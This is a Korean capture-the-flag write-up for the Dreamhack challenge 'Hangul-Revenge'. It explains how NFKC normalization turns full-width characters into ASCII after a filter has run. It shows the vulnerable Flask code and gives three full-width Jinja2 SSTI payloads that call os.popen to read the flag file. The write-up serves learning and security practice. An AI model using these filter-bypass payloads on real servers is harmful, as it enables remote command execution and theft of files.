# Challenge: dreamhack - Hangul-Revenge

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/1857
플래그 파일은 /home/hangul/flag에 있다고 한다.

## 문제 풀이
* 반각 문자와 전각 문자
    * 반각 문자는 1바이트 또는 ASCII 범위 문자를 의미하며 기본적인 키보드 입력 문자이다.
    * 전각 문자는 2바이트 유니코드 문자로 동아시아권 문자 체계에서 사용한다. 시각적으로 동일해도 코드상으로는 다른 문자이다.
* Unocide 정규화
    * Unocide 정규화 방식은 4가지가 있다. NFC, NFD, NFKC, NFKD로 K가 붙으면 Compatibility 변환을 수행한다.
    * NFKC의 풀네임은 Normalization Form Canonical Decomposition, followed by Canonical Composition
    * NFKC의 핵심 기능은 전각 문자를 반각 문자로 변환하고 한글 조합을 정규화한다는 것이다.
        ```python
        print(unicodedata.normalize("NFKC", "ㄱㅏ"))        # "가"
        print(unicodedata.normalize("NFKC", "ㅎㅏㄴㄱㅜㄹ"))  # "한글"
        ```

* SSTI(Server-Side Template Injection)
    * SSTI는 사용자 입력이 템플릿 엔진에 직접 전달되어 서버 측 코드가 실행 가능한 취약점이다.
    * Jinja2(Flask 템플릿 엔진)는 Python 표현식을 실행할 수 있게끔 설계되었기 때문에 사용자 입력이 직접 템플릿에 삽입되는 경우 SSTI 공격을 할 수 있다. 

## 문제 풀이
step 1
* app.py의 코드를 뜯어보자. 폼에 입력한 message에 대해 영어 알파벳을 필터링하고 특수문자와 숫자도 필터링하는 것을 알 수 있다. 이후 크로스 플랫폼 호환성을 목적으로 NFKC 정규화를 하는 코드가 있다. 이 점을 이용해 입력하고 싶은 코드를 전각 문자로 변환해 message로 전송하면 필터링은 우회하고 정규화를 거쳐 원래 입력하고자 한 코드르 변환될 것이다.
* 변환된 message가 템플릿 문자열의 %s 자리에 직접 삽입되는 것을 알 수 있다. 즉, 사용자 입력이 템플릿 코드로 해석되는 것이다. 따라서 SSTI 페이로드가 입력되게끔 하자.
    ```python
    if request.method == "POST":
        message = request.form["message"]
        if re.search("[a-zA-Z]", message):
            message = "한글을 사용합시다!"
        for i in "!@#$%^&*=;,<>?1234567890":
            if i in message:
                message = "해킹을 하지 맙시다!"
        message = unicodedata.normalize("NFKC", message)    # for normalize Windows and Mac Hangul implementation
    return render_template_string('''
        <form method="POST">
            입력: <input type="text" name="message">
            <input type="submit">
        </form>
        <p>출력:</p>
        <div>%s</div>
    ''' % message)
    ```


step 2 - 가능한 페이로드
* 아래 모든 페이로드는 전각 변환을 거친 결과이다. 
    ```
    ｛｛　ｓｅｌｆ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿．＿＿ｂｕｉｌｔｉｎｓ＿＿．＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｐｏｐｅｎ（＇ｃａｔ　／ｈｏｍｅ／ｈａｎｇｕｌ／ｆｌａｇ＇）．ｒｅａｄ（）　｝｝
    ```
    * self는 Jinja2 템플릿 내에서 현재 템플릿 인스턴스를 가리킨다.
    * self.__init__에서 __init__ 메서드는 클래스의 생성자이다. 이를 통해 클래스의 내부에 접근 가능하다.
    * self.__init__.__globals__에서 glboals는 global namespace를 의미한다. 즉, __init__ 메서드가 정의된 모듈의 global namespace를 요한다. 입력해서 출력해보면 {'__name__': 'jinja2.environment', ...}
    * self.__init__.__globals__.__builtins__에서 builtins는 python의 내장 함수/객체 저장소이다. 
    * self.__init__.__globals__.__builtins__.__import__('os')로 os 모듈에 접근 가능하다. 이렇게 가져온 os 객체로 파일 접근, 시스템 명령 실행 가능하다.

    ```
    ｛｛ ｃｏｎｆｉｇ．＿＿ｃｌａｓｓ＿＿．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿［'ｏｓ'］．ｐｏｐｅｎ（'ｃａｔ　／ｈｏｍｅ／ｈａｎｇｕｌ／ｆｌａｇ'）．ｒｅａｄ（） ｝｝
    ```
    * config는 Flask나 Jinja2 환경에서 보통 flask 애플리케이션 설정 객체이다. DEBUG, SECRET_KEY와 같은 설정이 들어가 있다.
    * config.__class__는 config 객체의 클래스 타입 객체를 의미한다.
    * 이미 os 모듈이 import 되어 있으므로 builtins에서 os를 import하지 않고 전역 딕셔너리에서 os 모듈을 꺼낸다. flask는 설정 파일 처리, 경로 관리를 위해 os 모듈을 적극적으로 사용하고 jinja2는 템플릿 처리에 집중하니 os 모듈이 항상 필요하지 않다는 차이


    ```
    {{ ｓｅｌｆ．＿ＴｅｍｐｌａｔｅＲｅｆｅｒｅｎｃｅ＿＿ｃｏｎｔｅｘｔ．ｃｙｃｌｅｒ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿．ｏｓ．ｐｏｐｅｎ（＇ｃａｔ　／ｈｏｍｅ／ｈａｎｇｕｌ／ｆｌａｇ＇）．ｒｅａｄ（） }}
    ```
    * cycler는 jinja2 내장 유틸리티 객체로 템플릿에서 값들을 순환할 때 사용한다. self._TemplateReference_context에는 그 템플릿의 context 객체, 즉 템플릿에서 사용 가능한 변수/객체가 들어있다. cycler는 보통 템플릿 global namespace에 있지만 없는 경우 위 방식으로 우회가 가능하다. 템플릿이 랜더링될 때 쓰는 context 객체 안에는 여전히 cycler가 들어있을 수 있기 때문이다.

## 결과
폼에 위 전각화된 스크립트를 넣으면 플래그가 나온다.